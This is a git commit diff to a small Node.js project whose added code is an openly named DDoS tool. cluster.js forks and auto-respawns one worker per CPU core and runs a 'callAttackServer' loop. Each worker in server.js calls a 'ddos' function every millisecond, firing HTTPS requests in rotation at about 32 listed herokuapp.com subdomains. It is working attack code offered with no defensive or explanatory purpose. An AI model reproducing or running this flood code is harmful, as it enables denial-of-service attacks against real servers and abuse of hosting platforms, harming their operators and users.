07039a0598d0e2426284f70240698f0f00d86807
rohansas <rohansas@protonmail.com>
2020-08-07 10:17:52 +0530

    check

--- cluster.js
+++ cluster.js
@@ -1,13 +1,35 @@
 const cluster = require('cluster');
 const os = require('os');
 
-if (cluster.isMaster) {
-  const cpus = os.cpus().length;
+if (cluster.isMaster) { 
+  const workers=[]
+  const num_processes = os.cpus().length;
+  var spawn = function(i) {
+    workers[i] = cluster.fork();
 
-  console.log(`Forking for ${cpus} CPUs`);
-  for (let i = 0; i<cpus; i++) {
-    cluster.fork();
-  }
+    // Optional: Restart worker on exit
+
+    workers[i].on('exit', function(worker, code, signal) {
+        // logger.log('respawning worker', i);
+        console.log('respawning worker', i)
+        spawn(i);
+    });
+};
+setInterval(callAttackServer,100)
+var count=0
+const urilArray=["fedros","tatras13","tatras","tatras12"]
+function callAttackServer(){
+workers[count].send({initial:urilArray[count]})
+count+=1;
+if(count>3) count=0
+}
+
+// Spawn workers.
+for (var i = 0; i < num_processes; i++) {
+    spawn(i);
+
+}
+
 } else {
   require('./server');
 }
--- server.js
+++ server.js
@@ -1,19 +1,29 @@
 const http=require('http')
+const https=require('https')
 const express = require("express")
 const hostname='0.0.0.0';
 const port=process.env.PORT || 8021;
 const app=express();
 const server=http.createServer(app)
+const botArray=["tatras4","tatras5","tatras6","tatras7","tatras8","tatras9","tatras10","tatras11","tatras12","tatras13","fadros","fedros","pytras","accalia","admetus","felixsa","ethanio","caspas","thorax","thoru","fagona","fagrus","cypruss","gapris","tikana","takris","fadnavis","crocasa","rasmon","rassas","dasnoma","dhanisa"]
 const listener=server.listen(port,hostname,()=>{console.log("Server spinned up on port "+listener.address().port)});
 app.get("/",(req,res,next)=>{
 res.send("randiap")
 res.end()
 
 })
-ddos(3)
-function ddos(index){
-    const uril="http://tatras"+index+".herokuapp.com/"
-    http.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
+// process.on("message",(msg)=>{
+// ddos(msg.initial)
+// })
+
+setInterval(ddos,1)
+var count=0;
+function ddos(){
+
+    const uril="https://"+botArray[count]+".herokuapp.com?index="+count+"count=3"
+    count=count+4;
+    if(count>=botArray.length) count=0;
+    https.get(uril, {headers:{ 'User-Agent': 'Node Server' }},(resp) => {
         let pythonData = '';
       
         // A chunk of data has been recieved.
@@ -23,7 +33,7 @@ function ddos(index){
       
         // The whole response has been received. Print out the result.
         resp.on('end', () => {
-            console.log(pythonData)
+            // console.log(pythonData + botArray[count-4])
         });
       
       }).on("error", (err) => {
